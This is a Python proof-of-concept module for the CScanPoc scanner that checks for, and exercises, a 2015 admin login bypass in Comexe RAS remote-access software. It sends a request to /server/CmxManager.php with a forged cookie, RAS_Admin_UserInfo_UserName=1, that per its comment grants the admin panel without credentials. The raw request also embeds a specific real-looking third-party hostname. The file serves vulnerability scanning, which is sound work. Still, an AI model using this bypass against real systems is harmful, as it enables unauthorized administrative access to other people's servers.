# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Comexe_0000'  # 平台漏洞编号，留空
    name = '科迈RAS远程快速接入方案后台登陆绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = '2015-10-01'  # 漏洞公布时间
    desc = '''
        科迈RAS 为企业提供了一种从中心点集中管理应用程序远程接入方法。
        科迈RAS远程快速接入方案后台 /server/CmxManager.php 登陆绕过。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0123807'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a646118d-352f-45ec-9d67-bd0b37353eb1'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 当cookie中RAS_Admin_UserInfo_UserName=任意值，可以绕过登陆界面访问后台页面
            raw = '''GET /server/CmxManager.php HTTP/1.1
Host: oa.escsi.cn:85
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://oa.escsi.cn:85/Client/CmxLogin.php?t=14524481767194
Cookie:  RAS_Admin_UserInfo_UserName=1
Connection: keep-alive
                '''
            path = "/server/CmxManager.php"
            target = arg+path
            code, head, res, errcode, _ = hh.http(target, raw=raw)
            if code == 200 and 'HREF="CmxManager.php"' in res and 'ID="CmxPgid_Directory"' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
